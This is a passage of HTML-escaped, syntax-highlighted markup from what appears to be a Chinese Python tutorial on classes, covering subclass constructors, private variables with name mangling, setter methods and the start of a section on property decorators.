&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Male&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#创建子类&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the Male class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#给子类设置构造函数&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Person.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,name,age,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;male&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#子类调用父类的构造函数，并进行修改。在这里直接将父类的gender设置为‘male’&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;He is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Female&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the Female class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Person.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,name,age,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;female&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;She is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Male&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#实例化的时候，就不需要再次传入性别参数&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaohong=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Female&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaohong&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;obj=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;choice&lt;&#x2F;span&gt;&lt;span&gt;([Xiaoming ,Xiaohong])&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(obj.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;类的私有变量&lt;&#x2F;p&gt;
&lt;p&gt;默认情况下，类的内部所定义的变量我们是通过点号来访问并修改的，这种变量称为公有变量，公有变量可以被用户修改，导致类的内部状态不一致，此时需要设置私有变量&lt;&#x2F;p&gt;
&lt;p&gt;通过私有变量限制访问&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;random &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;choice&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the person class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1.0  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#数据属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gender&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#这些变量是私有变量&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__name=name&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__age=age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__gender=gender&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;male&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# print(Xiaoming.age)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#可以访问私有属性，但是不建议这么做&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming._Person__age)  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#通过点号加入类名可以访问&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Xiaoming.age=20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# print(Xiaoming.age)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过设置函数来设置变量&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;random &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;choice&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the person class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1.0  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#数据属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gender&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#这些变量是私有变量&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__name=name&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__age=age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__gender=gender&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#两个set函数是设置函数&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;set_gender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gender&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__gender=gender&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;set_age&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__age=age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__age))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__gender))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;male&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;set_age&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;装饰器&lt;&#x2F;p&gt;
&lt;p&gt;在变量私有变量中，我们通过获取和设置函数，可以实现更安全的访问，但是在进行访问和设置的时候，比较麻烦，那就可以通过装饰器来实现&lt;&#x2F;p&gt;
&lt;p&gt;装饰器既能检测参数，又能像属性一样方便的访问和修改类的变量&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
